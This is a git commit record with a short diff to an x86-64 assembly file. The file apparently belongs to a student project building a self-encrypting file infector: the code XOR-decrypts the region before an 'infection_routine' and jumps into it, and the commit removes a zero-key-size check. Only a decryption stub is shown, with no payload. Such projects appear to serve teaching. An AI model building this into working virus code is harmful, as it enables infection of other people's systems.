f888fe54e5279c853849acc5bf65e41a899b0e8f
Jeremy Maia <jmaia@student.42.fr>
2025-03-23 15:58:58 +0100

    wip

--- srcs/main.s
+++ srcs/main.s
@@ -25,8 +25,6 @@ begin:
 	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
 	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
-	cmp rcx, 0					; if (key_size == 0)
-	je program_entry				; 	goto program_entry
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
 	jmp program_entry				; goto program_entry
